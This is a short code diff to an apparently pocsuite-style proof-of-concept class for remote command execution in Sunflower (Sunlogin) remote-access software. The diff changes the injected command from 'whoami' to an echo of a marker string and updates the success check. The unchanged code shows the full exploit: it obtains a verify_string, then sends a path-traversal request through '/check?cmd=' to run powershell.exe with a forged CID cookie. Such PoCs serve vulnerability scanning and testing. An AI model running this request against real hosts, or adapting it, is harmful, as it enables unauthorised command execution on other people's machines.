@@ -49,13 +49,13 @@ class sunflower_RCE_POC(POCBase):
         verify_string = json.loads(r.text).get('verify_string')
 
         if r.status_code == 200 and "verify_string" in r.text:
-            path = "/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+whoami"
+            path = "/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+echo+Warin9_0"
             vul_url = urljoin(url, path)
             header = {
                 "Cookie": "{}".format("CID=" + verify_string)
             }
             r = requests.get(vul_url, headers=header, timeout=self.timeout, verify=False)
-            if "system" in r.text:
+            if "Warin9_0" in r.text:
                 return vul_url, header
         return False
 
